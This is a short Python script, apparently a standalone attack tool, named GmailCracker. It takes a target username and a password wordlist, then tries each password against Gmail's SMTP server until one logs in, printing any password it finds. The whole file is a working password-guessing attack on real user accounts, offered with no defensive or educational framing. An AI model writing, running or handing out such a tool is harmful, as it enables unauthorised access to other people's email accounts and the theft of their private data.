import smtplib
import sys
import os
import time
import termcolor

class GmailCracker:
    def __init__(self) -> None:
        if len(sys.argv) == 1:
            print('Please input username and wordlist to attack!')
            sys.exit()
        self.username = sys.argv[1]
        self.filename = sys.argv[2]
        if not os.path.exists(self.filename):
            print("The file does not exit")
            sys.exit()

    def gmail_login(self,password):
        gmail_server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        print('*'*100)
        # gmail_server.ehlo()
        gmail_server.starttls()
        try:
            gmail_server.login(user=self.username,password=password)
            print('Password found: %s' % termcolor.colored(password,'blue'))
            return True
        except smtplib.SMTPAuthenticationError:
           
            return False
        except Exception as e:
            print(e)

    def run(self):
        crack_flag = False
        with open(self.filename) as f:
            for line in f.readlines():
                print('Try password: %s' % line.strip())
                res = self.gmail_login(line.strip())
                if res:
                    crack_flag = True
                time.sleep(3)
        if crack_flag == False:
            print("Failed to crack")

if __name__ == '__main__':
    cracker = GmailCracker()
    cracker.run()  